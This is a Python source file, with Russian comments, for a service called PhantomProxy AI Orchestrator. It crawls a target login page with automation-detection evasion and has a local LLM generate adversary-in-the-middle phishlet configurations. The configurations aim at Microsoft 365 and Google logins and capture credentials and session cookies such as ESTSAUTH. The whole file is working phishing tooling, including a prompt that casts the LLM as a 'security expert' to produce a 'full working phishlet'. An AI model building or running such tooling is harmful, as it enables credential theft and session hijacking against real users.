#!/usr/bin/env python3
"""
PhantomProxy AI Orchestrator
Автоматическая генерация фишлетов через LLM (Ollama + Llama 3)

Архитектура:
1. Playwright собирает трафик с целевого сайта
2. LLM анализирует структуру и генерирует YAML фишлет
3. Возвращает готовый конфиг для PhantomProxy
"""

import asyncio
import json
import logging
from typing import Dict, List, Optional
from dataclasses import dataclass, asdict
from playwright.async_api import async_playwright, Browser, Page
import ollama
from fastapi import FastAPI, HTTPException
from pydantic import BaseModel
import uvicorn

# Настройка логирования
logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

app = FastAPI(title="PhantomProxy AI Orchestrator")

# ==================== МОДЕЛИ ДАННЫХ ====================

@dataclass
class SiteInfo:
    """Информация о сайте для анализа"""
    url: str
    title: str
    forms: List[Dict]
    inputs: List[Dict]
    api_endpoints: List[str]
    js_files: List[str]
    cookies: List[Dict]
    headers: Dict[str, str]

@dataclass
class PhishletConfig:
    """Конфигурация фишлета"""
    author: str
    min_ver: str
    proxy_hosts: List[Dict]
    sub_filters: List[Dict]
    auth_tokens: List[Dict]
    credentials: Dict
    auth_urls: List[str]
    login: Dict
    js_inject: List[Dict]

class GenerateRequest(BaseModel):
    """Запрос на генерацию фишлета"""
    target_url: str
    template: str = "microsoft365"  # microsoft365, google, custom
    options: Optional[Dict] = None

class GenerateResponse(BaseModel):
    """Ответ с фишлетом"""
    success: bool
    phishlet_yaml: str
    analysis: Dict
    message: str

# ==================== PLAYWRIGHT СБОРЩИК ====================

class SiteCrawler:
    """Сбор информации о сайте через Playwright"""
    
    def __init__(self, headless: bool = True):
        self.headless = headless
        self.browser: Optional[Browser] = None
    
    async def start(self):
        """Запуск браузера"""
        playwright = await async_playwright().start()
        self.browser = await playwright.chromium.launch(
            headless=self.headless,
            args=[
                '--disable-blink-features=AutomationControlled',
                '--disable-dev-shm-usage',
                '--no-sandbox',
            ]
        )
        logger.info("Browser started")
    
    async def stop(self):
        """Остановка браузера"""
        if self.browser:
            await self.browser.close()
            logger.info("Browser stopped")
    
    async def crawl(self, url: str) -> SiteInfo:
        """Сбор информации о сайте"""
        if not self.browser:
            await self.start()
        
        context = await self.browser.new_context(
            user_agent="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
        )
        page = await context.new_page()
        
        try:
            logger.info(f"Crawling: {url}")
            
            # Перехват запросов
            api_endpoints = []
            js_files = []
            
            def handle_request(request):
                url = request.url
                if '/api/' in url or '/oauth/' in url or '/auth/' in url:
                    api_endpoints.append(url)
                if url.endswith('.js'):
                    js_files.append(url)
            
            page.on('request', handle_request)
            
            # Переход на страницу
            response = await page.goto(url, wait_until='networkidle', timeout=30000)
            
            # Сбор информации
            title = await page.title()
            
            # Формы
            forms = []
            form_elements = await page.query_selector_all('form')
            for i, form in enumerate(form_elements):
                action = await form.get_attribute('action') or ''
                method = await form.get_attribute('method') or 'POST'
                forms.append({
                    'id': i,
                    'action': action,
                    'method': method,
                })
            
            # Input поля
            inputs = []
            input_elements = await page.query_selector_all('input, select, textarea')
            for inp in input_elements:
                input_type = await inp.get_attribute('type') or 'text'
                input_name = await inp.get_attribute('name') or ''
                input_id = await inp.get_attribute('id') or ''
                is_required = await inp.get_attribute('required') is not None
                
                inputs.append({
                    'type': input_type,
                    'name': input_name,
                    'id': input_id,
                    'required': is_required,
                })
            
            # Cookies
            cookies = await context.cookies()
            
            # Заголовки
            headers = response.headers if response else {}
            
            logger.info(f"Collected: {len(forms)} forms, {len(inputs)} inputs, {len(api_endpoints)} API endpoints")
            
            return SiteInfo(
                url=url,
                title=title,
                forms=forms,
                inputs=inputs,
                api_endpoints=list(set(api_endpoints)),
                js_files=list(set(js_files)),
                cookies=cookies,
                headers=headers,
            )
            
        finally:
            await context.close()

# ==================== LLM ГЕНЕРАТОР ====================

class LLMGenerator:
    """Генерация фишлетов через LLM"""
    
    def __init__(self, model: str = "llama3.2"):
        self.model = model
        logger.info(f"LLM initialized with model: {model}")
    
    def generate_phishlet(self, site_info: SiteInfo, template: str = "microsoft365") -> PhishletConfig:
        """Генерация фишлета на основе информации о сайте"""
        
        # Промпт для LLM
        prompt = self._build_prompt(site_info, template)
        
        # Запрос к Ollama
        logger.info("Generating phishlet with LLM...")
        response = ollama.generate(
            model=self.model,
            prompt=prompt,
            stream=False,
        )
        
        # Парсинг YAML из ответа
        yaml_content = self._extract_yaml(response['response'])
        
        # Валидация (упрощённая)
        if not yaml_content:
            raise ValueError("LLM didn't generate valid YAML")
        
        logger.info("Phishlet generated successfully")
        
        # Для простоты возвращаем как строку
        # В продакшене нужно парсить YAML и возвращать PhishletConfig
        return yaml_content
    
    def _build_prompt(self, site_info: SiteInfo, template: str) -> str:
        """Построение промпта для LLM"""
        
        return f"""
Ты — эксперт по безопасности, создающий конфигурацию фишлета для PhantomProxy (AitM фреймворк).

Проанализируй информацию о целевом сайте:
- URL: {site_info.url}
- Title: {site_info.title}
- Формы: {json.dumps(site_info.forms, ensure_ascii=False)}
- Input поля: {json.dumps(site_info.inputs, ensure_ascii=False)}
- API endpoints: {json.dumps(site_info.api_endpoints[:10], ensure_ascii=False)}
- JS файлы: {json.dumps(site_info.js_files[:10], ensure_ascii=False)}

Создай YAML-конфигурацию в формате PhantomProxy Phishlet v1.0, включающую:

1. proxy_hosts — все поддомены для проксирования (основной: login, api)
2. sub_filters — правила замены доменов (ищи {site_info.url.split('/')[2]})
3. auth_tokens — cookie сессии (ищи ESTSAUTH, OAuth, session)
4. credentials — поля логина/пароля из форм
5. auth_urls — URLs успешной аутентификации
6. js_inject — скрипты для автозаполнения

Формат вывода: ТОЛЬКО YAML, без объяснений. Начни с 'author:' и закончи последним полем.

Пример структуры:
```yaml
author: '@ai-orchestrator'
min_ver: '1.0.0'
proxy_hosts:
  - phish_sub: ''
    orig_sub: 'login'
    domain: 'target.com'
    session: true
    is_landing: true
sub_filters:
  - triggers_on: 'target.com'
    search: 'https://target.com'
    replace: 'https://phish.domain.com'
auth_tokens:
  - domain: '.target.com'
    keys: ['session_cookie']
credentials:
  username:
    key: 'email'
    search: '(.*)'
    type: 'post'
  password:
    key: 'password'
    search: '(.*)'
    type: 'post'
```

Сгенерируй полный рабочий фишлет для {site_info.url}:
"""
    
    def _extract_yaml(self, response: str) -> str:
        """Извлечение YAML из ответа LLM"""
        # Поиск YAML блока
        if '```yaml' in response:
            start = response.find('```yaml') + 7
            end = response.find('```', start)
            return response[start:end].strip()
        elif '```' in response:
            start = response.find('```') + 3
            end = response.find('```', start)
            return response[start:end].strip()
        else:
            # Если нет маркеров, возвращаем как есть
            return response.strip()

# ==================== API ENDPOINTS ====================

# Глобальные объекты
crawler = SiteCrawler(headless=True)
llm = LLMGenerator(model="llama3.2")

@app.on_event("startup")
async def startup_event():
    """Запуск браузера при старте"""
    await crawler.start()

@app.on_event("shutdown")
async def shutdown_event():
    """Остановка браузера при завершении"""
    await crawler.stop()

@app.post("/api/v1/generate-phishlet", response_model=GenerateResponse)
async def generate_phishlet(request: GenerateRequest):
    """
    Генерация фишлета по URL целевого сайта
    
    Args:
        request: Запрос с target_url и template
    
    Returns:
        YAML конфигурация фишлета
    """
    try:
        logger.info(f"Generating phishlet for: {request.target_url}")
        
        # 1. Сбор информации о сайте
        site_info = await crawler.crawl(request.target_url)
        
        # 2. Генерация фишлета через LLM
        phishlet_yaml = llm.generate_phishlet(site_info, request.template)
        
        # 3. Анализ (статистика)
        analysis = {
            "forms_found": len(site_info.forms),
            "inputs_found": len(site_info.inputs),
            "api_endpoints_found": len(site_info.api_endpoints),
            "js_files_found": len(site_info.js_files),
            "template_used": request.template,
        }
        
        return GenerateResponse(
            success=True,
            phishlet_yaml=phishlet_yaml,
            analysis=analysis,
            message=f"Phishlet generated for {request.target_url}",
        )
        
    except Exception as e:
        logger.error(f"Generation failed: {str(e)}")
        raise HTTPException(status_code=500, detail=str(e))

@app.get("/health")
async def health_check():
    """Проверка здоровья сервиса"""
    return {"status": "ok", "service": "ai-orchestrator"}

@app.get("/api/v1/analyze/{url:path}")
async def analyze_site(url: str):
    """
    Анализ сайта без генерации фишлета
    
    Args:
        url: URL сайта для анализа
    
    Returns:
        Информация о сайте
    """
    try:
        site_info = await crawler.crawl(url)
        
        return {
            "url": site_info.url,
            "title": site_info.title,
            "forms": site_info.forms,
            "inputs": site_info.inputs,
            "api_endpoints": site_info.api_endpoints[:20],
            "js_files": site_info.js_files[:20],
        }
    except Exception as e:
        raise HTTPException(status_code=500, detail=str(e))

# ==================== ЗАПУСК ====================

if __name__ == "__main__":
    uvicorn.run(
        "main:app",
        host="0.0.0.0",
        port=8081,
        reload=True,
        log_level="info",
    )
